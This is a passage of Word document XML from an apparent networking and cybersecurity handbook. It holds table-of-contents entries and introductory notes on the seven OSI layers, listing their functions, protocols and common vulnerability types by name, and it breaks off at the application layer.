              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408684" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Detection Workflow</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408684 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="16B515F7" w14:textId="7391543C" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408685" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Payload Examples</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408685 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3C186671" w14:textId="69810FE2" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408686" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Tools</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408686 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>53</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0F1EE25B" w14:textId="3D392901" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408687" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Mitigation Strategies</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408687 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>53</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0952375B" w14:textId="2EDE86B7" w:rsidR="004D43F7" w:rsidRDefault="004D43F7">
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="7445A7AC" w14:textId="2F3E6FD1" w:rsidR="00E270C8" w:rsidRDefault="00E270C8">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br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="095461FF" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="009B2E17" w:rsidRDefault="00E270C8" w:rsidP="009B2E17"/>
    <w:p w14:paraId="01009CC0" w14:textId="6075DAE1" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Networking &amp; Cybersecurity Handbook </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F8A315E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>Part I – Networking Foundations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43949ECB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc208408471"/>
      <w:r>
        <w:t>OSI Model:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="379CA734" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The OSI Model (Open Systems Interconnection Model) is a conceptual framework that standardizes the functions of a networking or telecommunication system into seven distinct layers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC742C5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The 7 Layers of the OSI Model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A5940FA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Physical Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1EA69C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Function: Deals with the physical transmission of data over cables, radio or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>fibre</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>. Defines hardware specifications</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BEAAF2D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Examples: Ethernet cables, Wi-Fi, Hubs, Repeater</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="154F189B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: Wiretapping, Jamming, Physical tampering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166FC22F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Data Link Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="587950AD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Function: Provides error detection/correction and framing. Responsible for reliable transmission over a single link.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4118E140" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Example: Ethernet (MAC Address), Switches, ARP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72863D5F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: MAC Spoofing, ARP poisoning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22ED5FA6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Network Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077B19C8" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Function: Handles routing and addressing, decides the path packets take across networks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1898C328" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Examples: IP, Routers, ICMP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3783A388" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: IP Spoofing, ICMP flooding, Routing attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5025759E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Transport Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481E06BD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Function: Provides end-to-end communication between processes. Manages reliability, flow control, and error handling. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F5606B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Examples: TCP, UDP, ports (80, 443, etc.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A80C7F4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: SYN flooding (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>), session hijacking, buffer overflow attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1983C8BD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Session Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB8C01E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Function: Manages and controls the dialogue (sessions) between two computers. Establishes, maintains, and terminates connections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DAF275A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Examples: NetBIOS, RPC.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63856343" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: Session hijacking, replay attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3DEAB1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Presentation Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55614A9D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Function: Translates data into a format usable by the application layer (encryption, compression, encoding).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1078395D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Examples: SSL/TLS, JPEG, ASCII, encryption protocols.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3D4D78" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Vulnerabilities: SSL stripping, weak encryption algorithms.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD1E6A3" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Application Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1889C060" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Function: Closest to the user. Provides network services directly to applications (web, email, file transfer).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A5EF73" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Examples: HTTP/HTTPS, SMTP, FTP, DNS, SNMP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E0010B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: SQL Injection (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>), Cross-Site Scripting (XSS), CSRF, DNS poisoning, malware.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3394DCFC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRPr="004D43F7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc208408472"/>
      <w:r>
        <w:t>Protocols used in each layer</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="70EE8F27" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Layer 1 – Physical Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF6C2AF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>No real protocols</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37975C43" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Mostly hardware standards</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BB4204" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Layer 2 – Data Link Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE07ED3" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">PPP (Point-to-Point Protocol) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656E49A7" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ARP (Address Resolution Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530C862D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>STP (Spanning Tree Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22844584" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Layer 3 – Network Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476B9246" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IP (Internet Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D75F8D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ICMP (Internet Control Message Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557948B6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IGMP (Internet Group Management Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E75991" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IPsec – IP Security</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E63D549" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Routing Protocols:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66FA218A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>RIP (Routing Information Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E5AB0A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>OSPF (Open Shortest Path First)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19DF546F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>BGP (Border Gateway Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B6E9D6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Layer 4- Transport Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F358378" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TCP (Transmission Control Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33016C6F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>UDP (User Datagram Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A9AFFF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SCTP (Stream Control Transmission Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D1A308" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Layer 5 – Session Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056811C6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>RPC (Remote Procedure Call)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047E7E53" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SMPP (Short Message Peer-to-Peer)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C0E744" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Layer 6 – Presentation Layer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A74DD3F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TLS/SSL (Transport Layer Security)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10586B1D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">MIME </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B11F05A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>JPEG/PNG/GIF/MP3/MP4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3E728C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Layer 7 – Application Layer</w:t>
      </w:r>
